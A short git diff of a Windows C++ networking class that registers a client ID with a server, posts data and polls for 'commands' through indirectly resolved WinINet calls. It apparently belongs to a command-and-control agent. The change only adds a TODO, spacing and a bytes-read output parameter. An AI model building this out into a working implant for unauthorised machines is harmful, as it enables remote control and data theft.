@@ -4,7 +4,11 @@
 #include "apiFunc.hpp"
 #include "networkManager.hpp"
 
-
+/*
+    TODO
+        Re Write Entire code
+        handle timeouts, retrys etc
+*/
 
 
 Network::Network() {
@@ -42,6 +46,8 @@ Network::Network() {
     this->ClientID = NULL;
     
     
+
+
     
     this->baseurl = ServerConf->BaseURL;
     this->registerendpoint = ServerConf->registerEndpoint;
@@ -123,7 +129,7 @@ BOOL Network::PostData(_In_ BYTE* Data, SIZE_T DataLength) {
 
 
 
-BOOL Network::GetCommand(_Out_ PCHAR CommandData, SIZE_T BufferSize) {
+BOOL Network::GetCommand(_Out_ PCHAR CommandData, SIZE_T BufferSize, _Out_ INT *TotalRead) {
     HINTERNET hInternet = this->httpFunctions->InternetOpenA("TEST", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     memset(CommandData, 0, BufferSize);
 
@@ -191,6 +197,7 @@ BOOL Network::GetCommand(_Out_ PCHAR CommandData, SIZE_T BufferSize) {
         }
         else {
             CommandData[totalRead] = '\0';  // Null terminate
+            *TotalRead = totalRead;
             printf("Successfully read %zu bytes\n", totalRead);
             Success = TRUE;
         }
